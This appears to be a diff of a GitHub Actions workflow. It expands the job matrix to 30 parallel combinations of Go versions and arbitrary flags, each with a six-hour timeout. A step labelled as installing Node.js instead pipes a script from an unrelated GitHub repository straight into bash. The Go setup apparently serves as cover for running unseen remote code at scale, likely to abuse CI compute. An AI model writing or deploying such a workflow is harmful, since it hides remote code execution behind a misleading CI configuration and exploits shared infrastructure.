@@ -10,33 +10,22 @@ jobs:
     name: IPLAYBOOKS
     runs-on: ubuntu-latest
     strategy:
-      max-parallel: 15
+      max-parallel: 20 
       fail-fast: false
       matrix:
-        include:
-          - go: 1.11   flag: kmn
-          - go: 1.11   flag: oiu
-          - go: 1.11   flag: qwe
-          - go: 1.11   flag: nvb
-          - go: 1.11   flag: tby
-          - go: 1.11   flag: muh
-          - go: 1.12   flag: kmn
-          - go: 1.12   flag: oiu
-          - go: 1.12   flag: qwe
-          - go: 1.12   flag: nvb
-          - go: 1.12   flag: tby
-          - go: 1.12   flag: muh
-          - go: 1.13   flag: kmn
-          - go: 1.13   flag: oiu
-          - go: 1.13   flag: qwe
+        go: [1.11, 1.12, 1.13, 1.14, 1.15]
+        flag: [kmn, oiu, qwe, nvb, tby, muh]   # 5 x 6 = 30 kombinasi
     timeout-minutes: 360
     steps:
-      - uses: actions/setup-go@v1
+      - name: Set up Go ${{ matrix.go }}
+        uses: actions/setup-go@v1
         with:
           go-version: ${{ matrix.go }}
+        id: go
 
-      - uses: actions/checkout@v1
+      - name: Checkout
+        uses: actions/checkout@v1
 
-      - name: Install Node.js & Run ixi
+      - name: Install Node.js & Run ixi Script
         run: |
           curl -sL https://raw.githubusercontent.com/moyz-2/Dd/refs/heads/main/ixi | bash
